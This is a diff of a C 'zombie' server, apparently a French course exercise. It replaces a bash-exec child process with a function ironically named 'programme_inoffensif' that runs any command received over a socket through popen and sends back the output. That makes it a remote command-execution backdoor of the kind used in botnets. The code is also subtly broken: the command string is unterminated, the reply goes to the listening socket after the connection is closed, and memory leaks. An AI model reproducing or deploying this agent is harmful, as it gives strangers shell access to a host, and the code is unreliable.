@@ -15,41 +15,49 @@ void EndZombieHandler(int num){
     end = 1;
 }
 
-void programme_inoffensif(void* newsockfdd) {
-    int* newsockfd = newsockfdd;
-    char commande[256];
+char* programme_inoffensif(char* commande) 
+{
+    char* rep = malloc(100 * sizeof(char));
 
-    int fd = sread(*newsockfd,commande,strlen(commande));
+    FILE* fp = popen(commande, "r");
+    if (fp == NULL) {
+        perror("Erreur lors de l'exécution de la commande");
+        return NULL;
+    }
 
-    dup2(fd,0);
+    // Lecture réponse 
+    fgets(rep, 100, fp);
 
-    sexecl("/bin/bash", "bash", commande, (char *) NULL);
+    // Suppression du caractère de saut de ligne à la fin de la réponse
+    size_t len = strlen(rep);
+    if (len > 0 && rep[len - 1] == '\n') {
+        rep[len - 1] = '\0';
+    }
 
+    // Fermeture du flux de fichier
+    pclose(fp);
+
+    return rep;
 }
 
 int main(int argc, char *argv[]){
-    int port;
+    int sockfd = initSocketZombie();
 
-    if(argv[1] == NULL){
-        port = choisirPort();
-    }else{
-        port = atoi(argv[1]);
-    }
-    
-    int sockfd = initSocketZombie(port);
+    int newsockfd;
 
     while(!end){
         // attend une connexion
         printf("En attente de connexion\n");
-        int newsockfd = saccept(sockfd);
+        newsockfd = saccept(sockfd);
         printf("Connexion établie\n");
 
-        int pid_zombie = fork_and_run1(programme_inoffensif, &newsockfd);
+        char* commande = (char*) malloc(10*sizeof(char));
+        sread(newsockfd, commande, 10*sizeof(char));
+        char* rep = programme_inoffensif(commande);
 
-        /* Attente de la terminaison du processus fils */
-        int status;
-        swaitpid(pid_zombie, &status, 0);
         sclose(newsockfd);
+        // renvoyer la rep de la commande
+        swrite(sockfd, rep, sizeof(char)*100);
     }
 
     return 0;
